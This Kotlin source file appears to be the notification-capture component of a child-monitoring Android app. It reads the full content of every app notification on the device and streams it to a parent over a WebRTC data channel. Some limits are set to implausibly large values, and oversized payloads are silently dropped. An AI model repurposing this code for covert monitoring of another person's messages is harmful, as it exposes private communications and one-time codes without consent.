package com.soumo.child.components.notification

import android.app.Notification
import android.content.pm.PackageManager
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import org.webrtc.DataChannel
import java.nio.ByteBuffer
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.atomic.AtomicInteger

/**
 * Enhanced NotificationListener with:
 * - Batch processing to reduce overhead
 * - Rate limiting per app
 * - Configurable filtering
 * - Better error handling and recovery
 * - Notification grouping and priority handling
 */
class NotificationListener : NotificationListenerService() { // Listens to system notifications

    companion object { // Static members
        private const val TAG = "NotificationListener"
        private const val MAX_TEXT_LENGTH = 50000000
        private const val MAX_TITLE_LENGTH = 1000000
        private const val BATCH_INTERVAL_MS = 200L
        private const val MAX_BATCH_SIZE = 100000000
        private const val RATE_LIMIT_WINDOW_MS = 50000000L
        private const val MAX_NOTIFICATIONS_PER_APP = 5000

        @Volatile
        private var dataChannel: DataChannel? = null

        /**
         * Called from BackgroundService after DataChannel creation.
         */
        fun attachDataChannel(channel: DataChannel?) { // Attach DataChannel for communication
            dataChannel = channel // Set the static dataChannel reference
            Log.d(TAG, "DataChannel attached to NotificationListener")
        }

    }

    private val serviceScope = CoroutineScope(Dispatchers.Default + SupervisorJob())
    private val notificationBatch = mutableListOf<JSONObject>()
    private val batchLock = Any()
    private var batchJob: Job? = null

    // Rate limiting per app
    private val appNotificationCount = ConcurrentHashMap<String, AtomicInteger>()
    private val appLastResetTime = ConcurrentHashMap<String, Long>()

    // Filtering configuration
    private val ignoredPackages = setOf( // System packages to ignore
        "com.android.systemui",
        "android",
        // Add more system packages to ignore
    )

    // Statistics
    private var totalProcessed = 0
    private var totalSent = 0
    private var totalDropped = 0

    override fun onCreate() {
        super.onCreate()
        startBatchProcessor()
    }

    override fun onDestroy() { // Cleanup on service destroy
        super.onDestroy() // Call superclass implementation
        Log.w(TAG, "NotificationListenerService destroyed, cleaning up")
        batchJob?.cancel()
        serviceScope.cancel() // Cancel all coroutines
        flushBatch() // Send remaining notifications in batch
    }

    override fun onListenerConnected() { // Called when listener is connected
        super.onListenerConnected() // Call superclass implementation
        Log.d(TAG, "✅ NotificationListener connected") // Log connection

        // Optional: Send current active notifications on connect to sync state
        sendActiveNotificationsSnapshot() // Send snapshot of active notifications
    }

    override fun onListenerDisconnected() { // Called when listener is disconnected
        super.onListenerDisconnected() // Call superclass implementation
        Log.w(TAG, "❌ NotificationListener disconnected") // Log disconnection
        flushBatch() // Send remaining notifications in batch
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) { // Called when a notification is posted
        if (sbn == null) return // Ignore null notifications

        serviceScope.launch { // Process in coroutine
            try {
                processNotification(sbn) // Process the notification
            } catch (e: Exception) { // Catch all exceptions to prevent crashes
                Log.e(TAG, "Error processing notification", e)
            }
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) { // Called when a notification is removed
        // Optional: Track removed notifications if needed
        sbn?.let {
            serviceScope.launch { // Process in coroutine
                sendNotificationRemoved(it) // Notify parent of removal
            }
        }
    }

    private fun processNotification(sbn: StatusBarNotification) { // Process a single notification
        val packageName = sbn.packageName ?: return // Ignore if package name is null

        // Apply filters
        if (shouldIgnoreNotification(packageName, sbn)) { // Check if notification should be ignored
            totalDropped++ // Increment dropped count
            return
        }

        // Rate limiting per app
        if (!checkRateLimit(packageName)) { // Check if rate limit exceeded
            Log.d(TAG, "Rate limit exceeded for $packageName")
            totalDropped++ // Increment dropped count
            return
        }

        val notification = sbn.notification ?: return // Ignore if notification is null
        val extras = notification.extras ?: return // Ignore if extras are null

        val payload = buildNotificationPayload(sbn, notification, extras, packageName) // Build JSON payload

        totalProcessed++ // Increment processed count
        addToBatch(payload) // Add to batch for sending
    }

    private fun buildNotificationPayload( // Build JSON payload from notification
        sbn: StatusBarNotification, // StatusBarNotification object
        notification: Notification, // Notification object
        extras: android.os.Bundle, // Notification extras
        packageName: String // Package name of the app
    ): JSONObject { // Construct JSON payload
        val appName = getAppNameFromPackage(packageName) // Resolve app name from package
        val title = extras.getString(Notification.EXTRA_TITLE, "") // Get title
            .take(MAX_TITLE_LENGTH) // Truncate if too long
        val text = extras.getCharSequence(Notification.EXTRA_TEXT, "") // Get main text
            ?.toString()
            ?.take(MAX_TEXT_LENGTH) ?: "" // Truncate if too long

        // Extract additional notification details
        val subText = extras.getCharSequence(Notification.EXTRA_SUB_TEXT, "")?.toString()
        val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT, "")?.toString()
        val infoText = extras.getString(Notification.EXTRA_INFO_TEXT)
        val summaryText = extras.getString(Notification.EXTRA_SUMMARY_TEXT)

        // Get notification metadata
        val priority =
            notification.channelId ?: "default"

        val category = notification.category
        val isOngoing = (notification.flags and Notification.FLAG_ONGOING_EVENT) != 0
        val groupKey = notification.group

        return JSONObject().apply {
            put("version", 2) // Incremented version for new fields
            put("type", "NOTIFICATION")
            put("ts", System.currentTimeMillis())
            put("notificationId", sbn.id)
            put("notificationKey", sbn.key)
            put("childId", getChildId())

            put("body", JSONObject().apply {
                put("appName", appName)
                put("packageName", packageName)
                put("title", title)
                put("text", text)

                // Additional content
                if (!subText.isNullOrBlank()) put("subText", subText)
                if (!bigText.isNullOrBlank()) put("bigText", bigText.take(MAX_TEXT_LENGTH))
                if (!infoText.isNullOrBlank()) put("infoText", infoText)
                if (!summaryText.isNullOrBlank()) put("summaryText", summaryText)

                // Metadata
                put("priority", priority)
                put("category", category ?: "unknown")
                put("isOngoing", isOngoing)
                if (groupKey != null) put("groupKey", groupKey)
                put("postTime", sbn.postTime)

                // Actions count
                val actions = notification.actions
                if (actions != null) {
                    put("actionCount", actions.size)
                    put("actions", JSONArray().apply {
                        actions.take(3).forEach { action ->
                            put(action.title?.toString() ?: "")
                        }
                    })
                }
            })
        }
    }

    private fun shouldIgnoreNotification(packageName: String, sbn: StatusBarNotification): Boolean {
        // Ignore system packages
        if (packageName in ignoredPackages) return true

        // Ignore our own notifications
        if (packageName == applicationContext.packageName) return true

        // Ignore group summary notifications (prevent duplicates)
        if (sbn.notification.flags and Notification.FLAG_GROUP_SUMMARY != 0) return true

        val extras = sbn.notification.extras
        val title = extras.getString(Notification.EXTRA_TITLE, "")
        val text = extras.getCharSequence(Notification.EXTRA_TEXT, "")?.toString() ?: ""

        // Ignore empty notifications
        return title.isBlank() && text.isBlank()
    }

    private fun checkRateLimit(packageName: String): Boolean {
        val now = System.currentTimeMillis()
        val lastReset = appLastResetTime.getOrPut(packageName) { now }

        // Reset counter if window expired
        if (now - lastReset > RATE_LIMIT_WINDOW_MS) {
            appNotificationCount[packageName] = AtomicInteger(0)
            appLastResetTime[packageName] = now
        }

        val count = appNotificationCount.getOrPut(packageName) { AtomicInteger(0) }
        return count.incrementAndGet() <= MAX_NOTIFICATIONS_PER_APP
    }

    private fun addToBatch(payload: JSONObject) {
        synchronized(batchLock) {
            notificationBatch.add(payload)

            // Send immediately if batch is full
            if (notificationBatch.size >= MAX_BATCH_SIZE) {
                flushBatch()
            }
        }
    }

    private fun startBatchProcessor() {
        batchJob = serviceScope.launch {
            while (isActive) {
                delay(BATCH_INTERVAL_MS)
                flushBatch()
            }
        }
    }

    private fun flushBatch() {
        val batch = synchronized(batchLock) {
            if (notificationBatch.isEmpty()) return
            val copy = notificationBatch.toList()
            notificationBatch.clear()
            copy
        }

        if (batch.size == 1) {
            // Send single notification
            sendToParent(batch[0])
        } else {
            // Send as batch
            val batchPayload = JSONObject().apply {
                put("version", 2)
                put("type", "NOTIFICATION_BATCH")
                put("ts", System.currentTimeMillis())
                put("childId", getChildId())
                put("count", batch.size)
                put("notifications", JSONArray(batch))
            }
            sendToParent(batchPayload)
        }
    }

    private fun sendToParent(payload: JSONObject) {
        val channel = dataChannel
        if (channel == null || channel.state() != DataChannel.State.OPEN) {
            Log.w(TAG, "DataChannel not open, dropping notification payload")
            totalDropped++
            return
        }

        try {
            val message = payload.toString()
            val buffer = ByteBuffer.wrap(message.toByteArray())

            if (buffer.remaining() > 65536) { // WebRTC message size limit
                Log.w(TAG, "Payload too large (${buffer.remaining()} bytes), truncating")
                return
            }

            channel.send(DataChannel.Buffer(buffer, false))
            totalSent++

            if (totalSent % 50 == 0) {
                Log.d(TAG, "📊 Stats - Processed: $totalProcessed, Sent: $totalSent, Dropped: $totalDropped")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send notification payload", e)
            totalDropped++
        }
    }

    private fun sendNotificationRemoved(sbn: StatusBarNotification) {
        val payload = JSONObject().apply {
            put("version", 2)
            put("type", "NOTIFICATION_REMOVED")
            put("ts", System.currentTimeMillis())
            put("childId", getChildId())
            put("notificationKey", sbn.key)
            put("packageName", sbn.packageName)
        }
        sendToParent(payload)
    }

    private fun sendActiveNotificationsSnapshot() {
        try {
            val activeNotifications = activeNotifications ?: return
            val snapshot = JSONArray()

            activeNotifications.take(20).forEach { sbn ->
                if (!shouldIgnoreNotification(sbn.packageName ?: "", sbn)) {
                    snapshot.put(buildNotificationPayload(
                        sbn,
                        sbn.notification,
                        sbn.notification.extras,
                        sbn.packageName
                    ))
                }
            }

            if (snapshot.length() > 0) {
                val payload = JSONObject().apply {
                    put("version", 2)
                    put("type", "NOTIFICATION_SNAPSHOT")
                    put("ts", System.currentTimeMillis())
                    put("childId", getChildId())
                    put("notifications", snapshot)
                }
                sendToParent(payload)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error sending notification snapshot", e)
        }
    }

    private fun getAppNameFromPackage(packageName: String): String {
        return try {
            val pm = applicationContext.packageManager
            val appInfo = pm.getApplicationInfo(packageName, 0)
            pm.getApplicationLabel(appInfo).toString()
        } catch (_: PackageManager.NameNotFoundException) {
            packageName // Fallback to package name
        }
    }

    private fun getChildId(): String {
        val prefs = getSharedPreferences("phantom_prefs", MODE_PRIVATE)
        return prefs.getString("device_id", "unknown") ?: "unknown"
    }
}